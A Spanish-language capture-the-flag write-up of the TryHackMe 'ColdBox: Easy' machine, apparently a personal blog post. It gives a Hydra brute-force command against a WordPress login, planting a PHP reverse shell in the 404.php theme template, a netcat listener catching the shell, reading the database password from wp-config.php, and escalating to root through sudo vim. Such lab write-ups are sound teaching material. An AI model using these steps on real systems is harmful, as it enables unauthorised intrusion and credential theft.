---
title: "ColdBox: Easy"
date: 2024-03-27 16:00 +/-0000
categories: TryHackMe Máquina
tags:
  - tryhackme
  - easy
  - wordpress
author: okud4
toc: true
img_path: /assets/img/
image: /banners/Cold-Box.png
---

## RECONOCIMIENTO

Empezamos escaneando la direccion ip de la máquina con nmap, pero antes de nada en la web [Station X](https://www.stationx.net/nmap-cheat-sheet/)tenemos una buena herramienta para personalizar el tipo de escaneo que deseamos realizar.

Usare un comando para que detecte todos los puertos abiertos, detecte el sistema operativo.

```bash
sudo nmap -p- -O -A -T4 -vvv <ip>

PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4512/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNmVtaTpgUhzxZL3VKgWKq6TDNebAFSbQNy5QxllUb4Gg6URGSWnBOuIzfMAoJPWzOhbRHAHfGCqaAryf81+Z8=
|   256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/fNq/6XnAxR13/jPT28jLWFlqxd+RKSbEgujEaCjEc
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

Obtengo como resultado que en el puerto 80 corre un servidor Wordpress desactualizado y en el puerto 4512 se podria acceder mediante SSH. Lo mas facil en este caso es centrar el ataque en Wordpres.

Usando `dirb http://<ip>` me listará todos los directorios disponibles. Como resultado obtengo el directorio `/hidden/` y al acceder a dicho directorio obtengo una página web. Compruebo su código y obtengo un dato interesante:

```html5
<h2>[EDITADO], you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip</h2>
```

Compruebo que el usuario es válido, para hacerlo lo hago directamente en el login, si el usuario no existe, el propio login de Wordpress lo notifica:

![login](capturas/coldbox/userlogin.png)

Usaré Hydra para obtener acceso al blog.

```bash
hydra -l [USUARIO] -P /usr/share/wordlists/rockyou.txt 10.10.117.11 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.117.11%2Fwp-admin%2F&testcookie=1:S=Location" 
```

Y obtenemos el password para dicho usuario:

```bash
[80][http-post-form] host: 10.10.117.11   login: [USUARIO]   password: [PASSWORD]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-27 18:02:36
```

Ahora que tengo acceso al Wordpress, subo una shell para poder explotar el servidor. En mi caso, editaré la página 404.php y aqui incluiré una shell en php. Existe un plugin para navegador que me facilita el trabajo, se llama **_HackerTools_**. 

![template wordpress](capturas/coldbox/template.png)

Ahora para poder acceder al shell, en la terminal escribo el comand para conectarme por netcat y, para que esto funcione, en el navegador debo conseguir un error 404 (por ejemplo, con una url inexistente)

```bash
~ ❯ nc -lvnp 4455       
listening on [any] 4455 ...
connect to [10.9.206.239] from (UNKNOWN) [10.10.117.11] 50862
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:25:08 up  1:18,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ya estoy dentro, asi que ahora mejoro la terminal para poder trabajar con ella. El siguiente paso es ejecutar un comando que me permita localizar los archivos .txt 

```bash
www-data@ColddBox-Easy:/$ find / -type f -name '*.txt' 2>/dev/null
```

Tras localizar las posibles flags, para leer el contenido necesito ingresar como superusuario.

Para ello, primero obtengo el password que se encuentra alojado en la base de datos y la utilizo para logearme con el usuario y así obtener el flag oculto en el archivo user.txt.

```bash
www-data@ColddBox-Easy:/$ cd var/www/html/
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php | grep "DB_PASSWORD"
define('DB_PASSWORD', '[*]');
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
Password: 
c0ldd@ColddBox-Easy:/var/www/html$ cd
c0ldd@ColddBox-Easy:~$ ls
user.txt
c0ldd@ColddBox-Easy:~$ cat user.txt 

```

Ahora, necesito ser usuario root. Ejecuto el comando `sudo -l` para obtener los binarios a los que poder atacar.

```bash
c0ldd@ColddBox-Easy:/$ sudo -l
[sudo] password for c0ldd: 
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
c0ldd@ColddBox-Easy:/$ sudo vim
```

Ejecuto **_Vim_** como superusuario y dentro escribo 

```vim
:!bin/bash
```

y obtengo el ultimo flag:

```bash
root@ColddBox-Easy:/# cat /root/root.txt 
```

